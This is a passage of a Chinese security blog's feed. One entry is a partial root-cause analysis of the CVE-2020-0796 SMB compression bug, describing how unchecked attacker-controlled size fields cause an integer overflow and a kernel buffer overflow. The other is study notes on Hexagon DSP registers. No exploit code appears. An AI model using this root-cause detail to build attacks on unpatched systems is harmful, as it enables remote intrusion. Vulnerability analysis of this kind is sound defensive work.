title="漏洞"></a>漏洞</h2><p>我们来看一下未打补丁的版本…</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032734.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313032734.png"></a></p><p>看了一下..这里是将原本个值直接相加，并没有进行checkl… 然后分配内存..如果有问题 …应该是这里分配的内存太小..导致后续的缓冲区溢出吧？</p><p>由于我对这两个值不是很熟悉..所以这个时候开始查资料..</p><p>这个时候发现已经有人发文了…参考链接最后贴后面..</p><p>可以知道的是..这里的值一个是 OriginalCompressedSegmentSize  一个是 Offset/Length，他们 描述如下:</p><blockquote><ol><li>OriginalCompressedSegmentSize (4 bytes) The size, in bytes, of the uncompressed data segment.</li><li>Offset/Length (4 bytes) If SMB2_COMPRESSION_FLAG_CHAINED is set in Flags field, this field MUST be interpreted as Length. The length, in bytes, of the compressed payload. Otherwise, this field MUST be interpreted as Offset. The offset, in bytes, from the end of this structure to the start of compressed data segment.</li></ol></blockquote><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033313.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033313.png"></a></p><p>然后做了什么事情呢？</p><p>看代码，将分配的内存 用 SmbCompressionDecompress 这个函数进行处理</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033424.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033424.png"></a></p><p>我在 srvnet 里找到了 SmbCompressionDecompress 这个函数</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033623.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200313033623.png"></a></p><p>然后又调用了 <code>RtlDecompressBufferEx2</code> 这个函数..最后调的是 <code>RtlDecompressBufferXpressLz</code> 这个函数…</p><p>这个函数在<code>ntoskrnl. exe</code> 里</p><p>这个函数做的是事情就是..</p><p><code>memcpy(ptr,src,len)</code></p><p>ptr 是由 <code>SrvNetAllocateBuffer</code>分配的<code>UncompressBuffer</code>，<code>len</code> 是从smb 包解析的解压数据的大小，这个值是攻击者可控的， 由于前面没有检查..所以我们传入一个很大的值，使其触发整型溢出.分配一个较小的内存…此时 len又是一个大的值..所以导致了缓冲区溢出</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200314024525.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200314024525.png"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/1d435f21-9a21-4f4c-828e-624a176cf2a0</a></p><p><a href="http://blogs.360.cn/post/CVE-2020-0796.html">http://blogs.360.cn/post/CVE-2020-0796.html</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</summary>
      
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="CVE-2020-0796" scheme="https://bestwing.me/tags/CVE-2020-0796/"/>
    
  </entry>
  
  <entry>
    <title>Hexagon 学习 --- 寄存器篇</title>
    <link href="https://bestwing.me/Herxagon%20%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0.html"/>
    <id>https://bestwing.me/Herxagon%20%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0.html</id>
    <published>2020-03-11T16:00:00.000Z</published>
    <updated>2020-03-12T07:31:24.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="Hexagon-学习"><a href="#Hexagon-学习" class="headerlink" title="Hexagon 学习"></a>Hexagon 学习</h1><p>就是按照手册过了一遍，仅仅是个人的笔记。</p><h2 id="Registers-寄存器"><a href="#Registers-寄存器" class="headerlink" title="Registers 寄存器"></a>Registers 寄存器</h2><blockquote><p>The Hexagon processor has two sets of registers: general registers and control registers. The general registers include thirty-two 32-bit registers (named R0 through R31) which can be accessed either as single registers or as aligned 64-bit register pairs. The general registers are used to contain all pointer, scalar, vector, and accumulator data. The control registers include special-purpose registers such as program counter, status register, loop registers, etc.</p></blockquote><p>分为通用寄存器和控制寄存器， 通用寄存器包括32个32位寄存器，以R0到R31命名，另外这里提到了可以通过定义一个寄存器对来表示一个64位寄存器..例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R1：0 &#x3D;memd(R3)          &#x2F;&#x2F;导入双字</span><br><span class="line">R7:6&#x3D;valignb(R9:8,R7:6,#2)   &#x2F;&#x2F;适量对齐</span><br></pre></td></tr></table></figure><h3 id="寄存器对"><a href="#寄存器对" class="headerlink" title="寄存器对"></a>寄存器对</h3><p>下图显示了寄存器对的结构</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312032950.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312032950.png"></a> </p><p>在这些通用寄存器当中，R29-R32被用来支持子程序的调用以及程序栈，这些寄存器可以无保留的被子程序调用或栈指令改变。在编程环境中，R29-R32可以用符号来表示。例如：</p><p>  SP=add(SP,#-8)    //sp是R29的别名</p><p>  Allocfram             //更改寄存器R29(SP)以及R30（FP）</p><p>  call init                //更改LR（R31）</p><h3 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h3><p>下图显示了这些别名后的通用寄存器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For example:</span><br><span class="line">SP &#x3D; add(SP, #-8) &#x2F;&#x2F; SP is alias of R29</span><br><span class="line">allocframe &#x2F;&#x2F; Modifies SP (R29) and FP (R30)</span><br><span class="line">call init &#x2F;&#x2F; Modifies LR (R31)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033255.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033255.png"></a></p><p>在这些通用寄存器当中，R29-R32被用来支持子程序的调用以及程序栈，这些寄存器可以无保留的被子程序调用或栈指令改变。在编程环境中，R29-R32可以用符号来表示。</p><h3 id="控制寄存器"><a href="#控制寄存器" class="headerlink" title="控制寄存器"></a>控制寄存器</h3><p>Hexagon处理器包含了一系列的32位的控制寄存器，这些寄存器可以让我们对处理器中的PC，硬件回路以及矢量分支预测进行操作。</p><p> 与通用寄存器不同，控制寄存器中有些特殊的控制寄存器可用来当做操作数，有时候寄存器可以被转换成指令从而被用作操作数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For example:</span><br><span class="line">R2 &#x3D; memw(R0++M1) &#x2F;&#x2F; Auto-increment addressing mode (M1)</span><br><span class="line">R9 &#x3D; PC &#x2F;&#x2F; Get program counter (PC)</span><br><span class="line">LC1 &#x3D; R3 &#x2F;&#x2F; Set hardware loop count (LC1)</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033443.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033443.png"></a></p><p>控制寄存器别名规则：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033639.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033639.png"></a></p><p>控制寄存器同样可以被定义为寄存器对从而表示一个64位的寄存器，控制寄存器的凑对使用别名来定义，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C1:0 &#x3D; R5:4 &#x2F;&#x2F; C1:0 specifies the LC0&#x2F;SA0 register pair</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033809.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312033809.png"></a></p><h4 id="程序计数器-Program-Counter（PC）"><a href="#程序计数器-Program-Counter（PC）" class="headerlink" title="程序计数器 Program Counter（PC）"></a>程序计数器 Program Counter（PC）</h4><p>PC 寄存器是用来指向下一个指令的位置. 他可以通过指令的执行来间接修改，也可被直接读取例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R7 &#x3D; PC &#x2F;&#x2F; Get program counter</span><br></pre></td></tr></table></figure><p>NOTE The PC register is read-only: writing to it has no effect.</p><h4 id="循环寄存器-Loop-registers"><a href="#循环寄存器-Loop-registers" class="headerlink" title="循环寄存器 Loop registers"></a>循环寄存器 Loop registers</h4><p>Hewxagon 的处理器包括两组循环寄存器用来支持嵌套的硬件循环, 每个循环包含了循环计数器以及循环开始位置的寄存器。循环寄存器可以通过 loop 指令修改，同时也可以直接访问，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">loop0(start, R4) &#x2F;&#x2F; Modifies LC0 and SA0 (LC0&#x3D;R4, SA0&#x3D;&amp;start)</span><br><span class="line">LC1 &#x3D; R22 &#x2F;&#x2F; Set loop1 count</span><br><span class="line">R9 &#x3D; SA1 &#x2F;&#x2F; Get loop1 start address</span><br></pre></td></tr></table></figure><h4 id="用户状态寄存器-User-Status-register"><a href="#用户状态寄存器-User-Status-register" class="headerlink" title="用户状态寄存器 User  Status register"></a>用户状态寄存器 User  Status register</h4><p>用户状态寄存器（USR）存储可由用户程序访问的处理器状态和控制位。状态位包含某些指令的状态结果，而控制位包含用户可设置的处理器模式，用于硬件预取</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9:8 &#x3D; vaddw(R9:8, R3:2):sat &#x2F;&#x2F; Vector add words</span><br><span class="line">R6 &#x3D; USR &#x2F;&#x2F; Get saturation status</span><br></pre></td></tr></table></figure><p>USR 可包含一下的状态和控制值</p><ul><li><p>启用缓存预取 Cache prefetch enable</p></li><li><p>缓存预取状态 Cache prefetch status</p></li><li><p>浮点模式 Floating point modes</p></li><li><p>浮点状态 Floating point status </p></li><li><p>硬件回路配置 Hardware loop configuration</p></li><li><p>Sticky saturation overflow </p></li></ul><blockquote><p>NOTE A user control register transfer to USR cannot be grouped in an instruction packet with a floating point instruction (Section 4.3.4). Whenever a transfer to USR changes the Enable trap bits [29:25], an isync instruction (Section 5.10) must be executed before the new exception programming can take effect.</p></blockquote><h4 id="修饰寄存器-Modifier-registers"><a href="#修饰寄存器-Modifier-registers" class="headerlink" title="修饰寄存器  Modifier registers"></a>修饰寄存器  Modifier registers</h4><p>修饰寄存器用于 （M0-M1） 用于以下寻址模式</p><ul><li><p>间接自动递增寄存器寻址 Indirect auto-increment register addressing</p></li><li><p>循环寻址 Circular addressing</p></li><li><p>bit-reversed 寻址 Bit-reversed addressing</p></li></ul><p><strong>Indirect auto-increment register addressing</strong></p><p>在间接自动递增寄存器寻址中，修改符寄存器存储一个<br>带符号的32位值，用于指定增量（或减量）值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">M1 &#x3D; R0 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R3 &#x3D; memw(R2++M1) &#x2F;&#x2F; Load word</span><br></pre></td></tr></table></figure><p><strong>Circular</strong></p><p>在循环寻址中，修饰寄存器存储循环缓冲区的长度和相关的 “k” 和 “I” 的值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">M0 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R0 &#x3D; memb(R2++#4:circ(M0)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by R2 with size&#x2F;K vals in M0</span><br><span class="line">R0 &#x3D; memb(R7++I:circ(M1)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by R7 with size&#x2F;K&#x2F;I vals in M1 </span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312144717.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312144717.png"></a></p><p><strong>Bit-reversed</strong></p><p>在位反转寻址中，修改器寄存器存储带符号的32位 指定增量（或减量）值的值。例如</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">M1 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R2 &#x3D; memub(R0++M1:brev) &#x2F;&#x2F; The address is (R0.H | bitrev(R0.L))</span><br><span class="line"> &#x2F;&#x2F; The orginal R0 (not reversed) is added</span><br><span class="line"> &#x2F;&#x2F; to M1 and written back to R0</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145512.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145512.png"></a></p><h4 id="分支预测寄存器-Predicate-registers"><a href="#分支预测寄存器-Predicate-registers" class="headerlink" title="分支预测寄存器 Predicate registers"></a>分支预测寄存器 Predicate registers</h4><p>分支预测寄存器（P0-P3）保存了标量与矢量对比计算的结果，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">P1 &#x3D; cmp.eq(R2, R3) &#x2F;&#x2F; Scalar compare</span><br><span class="line">if (P1) jump end &#x2F;&#x2F; Jump to address (conditional)</span><br><span class="line">R8 &#x3D; P1 &#x2F;&#x2F; Get compare status (P1 only)</span><br><span class="line">P3:0 &#x3D; R4 &#x2F;&#x2F; Set compare status (P0-P3)</span><br></pre></td></tr></table></figure><p> 这四个分支预测寄存器可被设置成四倍状态，此时此四个寄存器被表示成一个32位的寄存器</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145842.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312145842.png"></a></p><h4 id="循环起始寄存器-Circular-start-registers"><a href="#循环起始寄存器-Circular-start-registers" class="headerlink" title="循环起始寄存器 Circular start registers"></a>循环起始寄存器 Circular start registers</h4><p>循环起始寄存器（CS0-CS1）将循环缓冲区的起始地址存储在循环寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CS0 &#x3D; R5 &#x2F;&#x2F; Set circ start register</span><br><span class="line">M0 &#x3D; R7 &#x2F;&#x2F; Set modifier register</span><br><span class="line">R0 &#x3D; memb(R2++#4:circ(M0)) &#x2F;&#x2F; Load from circ buffer pointed</span><br><span class="line"> &#x2F;&#x2F; to by CS0 with size&#x2F;K vals in M0</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150712.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150712.png"></a></p><h4 id="用户通用指针寄存器-User-general-pointer-register"><a href="#用户通用指针寄存器-User-general-pointer-register" class="headerlink" title="用户通用指针寄存器 User general pointer register"></a>用户通用指针寄存器 User general pointer register</h4><p>The user general pointer (UGP) register is a general-purpose control register.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; UGP &#x2F;&#x2F; Get UGP</span><br><span class="line">UGP &#x3D; R3 &#x2F;&#x2F; Set UGP</span><br></pre></td></tr></table></figure><p>UGP通常用于存储线程本地存储的地址。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150913.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312150913.png"></a></p><h4 id="全局指针-Global-pointer"><a href="#全局指针-Global-pointer" class="headerlink" title="全局指针 Global pointer"></a>全局指针 Global pointer</h4><p>全局指针（GP）用于GP相对寻址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GP &#x3D; R7 &#x2F;&#x2F; Set GP</span><br><span class="line">R2 &#x3D; memw(GP+#200) &#x2F;&#x2F; GP-relative load</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151031.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151031.png"></a></p><h4 id="周期计数寄存器-Cycle-count-registers"><a href="#周期计数寄存器-Cycle-count-registers" class="headerlink" title="周期计数寄存器 Cycle count registers"></a>周期计数寄存器 Cycle count registers</h4><p>周期计数寄存器（UPCYCLELO-UPCYCLEHI）存储一个64位值，其中包含自从上次重置Hexagon处理器以来当前执行的处理器周期数。</p><p>[^NOTE]: The RTOS must grant permission to access these registers. Without this permission, reading these registers from user code always returns zero.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R5 &#x3D; UPCYCLEHI &#x2F;&#x2F; Get cycle count (high)</span><br><span class="line">R4 &#x3D; UPCYCLELO &#x2F;&#x2F; Get cycle count (low)</span><br><span class="line">R5:4 &#x3D; UPCYCLE &#x2F;&#x2F; Get cycle count</span><br></pre></td></tr></table></figure><h4 id="帧限制寄存器-Frame-limit-register"><a href="#帧限制寄存器-Frame-limit-register" class="headerlink" title="帧限制寄存器  Frame limit register"></a>帧限制寄存器  Frame limit register</h4><p>帧限制寄存器（FRAMELIMIT）存储存储区的低地址为软件栈保留</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; FRAMELIMIT &#x2F;&#x2F; Get frame limit register</span><br><span class="line">FRAMELIMIT &#x3D; R3 &#x2F;&#x2F; Set frame limit register</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151516.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151516.png"></a></p><h4 id="栈key寄存器-Frame-key-registe"><a href="#栈key寄存器-Frame-key-registe" class="headerlink" title="栈key寄存器 Frame key registe"></a>栈key寄存器 Frame key registe</h4><p>frame key register  （FRAMEKEY）当它们存储在软件堆栈中时返回地址时用来存储用于XOR加密的密钥值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">R2 &#x3D; FRAMEKEY &#x2F;&#x2F; Get frame key register</span><br><span class="line">FRAMEKEY &#x3D; R1 &#x2F;&#x2F; Set frame key register</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151753.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312151753.png"></a></p><h4 id="数据包计数寄存器-Packet-count-registers"><a href="#数据包计数寄存器-Packet-count-registers" class="headerlink" title="数据包计数寄存器 Packet count registers"></a>数据包计数寄存器 Packet count registers</h4><p>数据包计数寄存器（PKTCOUNTLO-PKTCOUNTHI）存储一个64位值，其中包含自上次写入PKTCOUNT寄存器以来执行的指令数据包的当前数量。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R9 &#x3D; PKTCOUNTHI &#x2F;&#x2F; Get packet count (high)</span><br><span class="line">R8 &#x3D; PKTCOUNTLO &#x2F;&#x2F; Get packet count (low)</span><br><span class="line">R9:8 &#x3D; PKTCOUNT &#x2F;&#x2F; Get packet count</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312153022.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312153022.png"></a></p><h4 id="Qtimer寄存器"><a href="#Qtimer寄存器" class="headerlink" title="Qtimer寄存器"></a>Qtimer寄存器</h4><p>Qtimer寄存器（UTIMERLO-UTIMERHI）提供对Qtimer全局参考计数值的访问。 它们使Hexagon软件能够读取64位时间值，而不必执行昂贵的AHB加载。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">R5 &#x3D; UTIMERHI &#x2F;&#x2F; Get Qtimer reference count (high)</span><br><span class="line">R4 &#x3D; UTIMERLO &#x2F;&#x2F; Get Qtimer reference count (low)</span><br><span class="line">R5:4 &#x3D; UTIMER &#x2F;&#x2F; Get Qtimer reference count</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312152205.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200312152205.png"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">最近在看高通的东西 这个就是按照手册过了一边，仅仅是个人的笔记。</summary>
    
    
    
    <category term="Summary" scheme="https://bestwing.me/categories/Summary/"/>
    
    
    <category term="hexagon" scheme="https://bestwing.me/tags/hexagon/"/>
    
  </entry>
  
</feed>
